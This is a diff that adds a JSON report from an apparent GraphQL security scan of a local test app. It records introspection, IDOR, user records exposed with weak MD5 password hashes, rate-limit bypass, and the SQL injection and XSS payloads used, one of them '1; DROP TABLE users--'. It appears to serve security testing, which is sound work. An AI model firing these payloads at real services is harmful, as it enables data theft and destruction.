@@ -1,0 +1,90 @@
+{
+  "target": "http://localhost:5000",
+  "timestamp": "2026-10-06T18:50:12.311696",
+  "endpoint": "http://localhost:5000/graphql",
+  "vulnerable": true,
+  "schema": {
+    "type_count": 17,
+    "type_names": [
+      "Query",
+      "User",
+      "Int",
+      "String",
+      "Boolean",
+      "Post",
+      "Mutation",
+      "CreateUser",
+      "CreatePost"
+    ]
+  },
+  "findings": [
+    {
+      "type": "introspection_enabled",
+      "severity": "MEDIUM",
+      "detail": "Introspection query returned schema"
+    },
+    {
+      "type": "idor_direct",
+      "severity": "HIGH",
+      "detail": "Read user 2 without auth",
+      "response": "{\"data\":{\"user\":{\"email\":\"alice@example.com\",\"id\":2,\"role\":\"user\",\"username\":\"alice\"}}}\n"
+    },
+    {
+      "type": "all_users_exposed",
+      "severity": "CRITICAL",
+      "detail": "All users returned with emails",
+      "response": "{\"data\":{\"users\":[{\"email\":\"admin@example.com\",\"id\":1,\"password\":\"5f4dcc3b5aa765d61d8327deb882cf99\",\"username\":\"admin\"},{\"email\":\"alice@example.com\",\"id\":2,\"password\":\"e10adc3949ba59abbe56e057f20f883e\",\"username\":\"alice\"},{\"email\":\"bob@example.com\",\"id\":3,\"password\":\"25d55ad283aa400af464c76d713c07ad\",\"username\":\"bob\"}]}}\n"
+    },
+    {
+      "type": "sqli",
+      "severity": "CRITICAL",
+      "payload": "1' OR '1'='1",
+      "detail": "SQL error in response"
+    },
+    {
+      "type": "sqli",
+      "severity": "CRITICAL",
+      "payload": "1' UNION SELECT NULL--",
+      "detail": "SQL error in response"
+    },
+    {
+      "type": "sqli",
+      "severity": "CRITICAL",
+      "payload": "1--",
+      "detail": "SQL error in response"
+    },
+    {
+      "type": "sqli",
+      "severity": "CRITICAL",
+      "payload": "1; DROP TABLE users--",
+      "detail": "SQL error in response"
+    },
+    {
+      "type": "xss",
+      "severity": "HIGH",
+      "payload": "<script>alert(1)</script>"
+    },
+    {
+      "type": "xss",
+      "severity": "HIGH",
+      "payload": "<img src=x onerror=alert(1)>"
+    },
+    {
+      "type": "rate_limit_bypass",
+      "severity": "MEDIUM",
+      "detail": "Alias batching accepted"
+    },
+    {
+      "type": "array_batching",
+      "severity": "MEDIUM",
+      "detail": "20 queries in one request"
+    }
+  ],
+  "pocs": [
+    {
+      "name": "idor_user2",
+      "path": "./graphql_pocs/poc_introspection.py"
+    }
+  ],
+  "error": null
+}
